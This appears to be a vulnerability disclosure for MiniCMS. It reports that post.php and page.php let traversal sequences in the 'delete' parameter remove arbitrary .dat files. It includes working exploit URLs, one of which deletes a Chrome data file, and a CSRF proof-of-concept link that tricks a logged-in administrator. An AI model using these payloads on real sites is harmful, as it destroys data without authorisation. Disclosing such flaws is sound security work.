Software Link : https://github.com/bg5sbk/MiniCMS After the installation is complete, log in as administrator, open the page

In post.php, user can delete any local .dat files without filter

[![XgVxl6.png](https://s1.ax1x.com/2022/06/11/XgVxl6.png)](https://imgtu.com/i/XgVxl6)

Create 1.dat in the parent directory

[![XgZ9mD.png](https://s1.ax1x.com/2022/06/11/XgZ9mD.png)](https://imgtu.com/i/XgZ9mD)

To delete 1.dat, the url is like http://127.0.0.1:80/MiniCMS-master/mc-admin/post.php?delete=../1&state=delete&date=&tag=

Also you can delete any .dat file like local google chrome file

[![XgZPTH.png](https://s1.ax1x.com/2022/06/11/XgZPTH.png)](https://imgtu.com/i/XgZPTH)

http://127.0.0.1:80/MiniCMS-master/mc-admin/page.php?delete=../../../../../../../../opt/google/chrome/icudtl&state=delete&date=&tag=

Here is CSRF POC test.html: Log in and click the link in test.html, modify the parameter of delete and users will delete the .dat file in the specified directory at last.

```Plaintext
<a href="http://127.0.0.1:80/MiniCMS-master/mc-admin/post.php?delete=../1&state=delete&date=&tag=">click</a>
```
